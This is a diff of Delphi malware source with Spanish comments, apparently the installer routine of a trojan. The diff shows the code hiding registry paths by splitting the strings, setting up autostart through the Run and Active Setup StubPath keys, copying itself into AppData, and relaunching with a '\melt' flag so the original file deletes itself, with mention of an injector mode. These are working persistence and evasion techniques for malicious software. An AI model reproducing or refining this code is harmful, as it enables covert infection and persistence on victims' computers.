@@ -69,7 +69,7 @@ begin
       Clave := Clave + 'ows\CurrentVe';
       Clave := Clave + 'rsion\Run\';
       Clave := Clave + Configuracion.sRunRegKeyName;
-       RegSetString(HKEY_CURRENT_USER, Clave, (Configuracion.sCopyTo + Configuracion.sFileNameToCopy)+' s');
+       RegSetString(HKEY_CURRENT_USER, Clave, '"'+(Configuracion.sCopyTo + Configuracion.sFileNameToCopy)+'" s');
     end;
 
     if(Configuracion.bArranqueActiveSetup) then
@@ -80,7 +80,7 @@ begin
       Clave := Clave + 'tive Setup\In';
       Clave := Clave + 'stalled Components\';
       Clave := Clave + Configuracion.sActiveSetupKeyName+'\StubPath';
-      RegSetString(HKEY_CURRENT_USER, Clave, (Configuracion.sCopyTo + Configuracion.sFileNameToCopy)+' s');
+      RegSetString(HKEY_CURRENT_USER, Clave, '"'+(Configuracion.sCopyTo + Configuracion.sFileNameToCopy)+'" s');
     end;
     
     Sleep(20000); //20 sec
@@ -107,11 +107,7 @@ end;
 procedure Instalar();
 var
   i:    cardinal;
-  hProcess: THandle;
-  Process32: TProcessEntry32;
   SHandle: THandle;
-  Pid:  string;
-  Next: BOOL;
 
   FoundFile: TWin32FindData;
   //  H : THandle;
@@ -128,12 +124,10 @@ begin
     Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
       '%RootDir%\', FindRootDir());
     Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
-      '%AppDir%\', GetSpecialFolderPath(CSIDL_LOCAL_APPDATA));
+      '%AppDir%\', GetSpecialFolderPath($001C));
       
   if Configuracion.bCopiarArchivo then //Si me tengo que copiar entonces...
   begin
-  
-
     //Si la carpeta no existe la intento crear
 
       try
@@ -145,7 +139,7 @@ begin
       except
       end;
     {if not DirectoryExists(Configuracion.sCopyTo) then
-      Configuracion.sCopyTo := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA));     }
+      Configuracion.sCopyTo := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA)); }
     //Osea que no la pude crear y sigue sin existir. En ese caso me instalo en el %appdir%
 
 
@@ -217,20 +211,15 @@ begin
             ShellExecute(GetDesktopWindow(), 'open',
           PChar('"' + Configuracion.sCopyTo + Configuracion.sFileNameToCopy + '"'),
           PChar('\melt ' + '"' + ParamStr(0) + '"'), nil, 0);
-            exitprocess(0);
           end;
         end
         else
 
-         if(Configuracion.sinyectadorfile = '') then //si no estamos inyectados tenemos que cerrar nuestro proceso
-         begin
+          sleep(500);
           ShellExecute(GetDesktopWindow(), 'open',
-          PChar('"' + Configuracion.sCopyTo + Configuracion.sFileNameToCopy + '"'), 'i', nil, 0);
+          PChar('"' + Configuracion.sCopyTo + Configuracion.sFileNameToCopy + '"'), '', nil, 0);
             exitprocess(0);
-         end
-         else
-         begin
-         end;
+
 
       end;
 
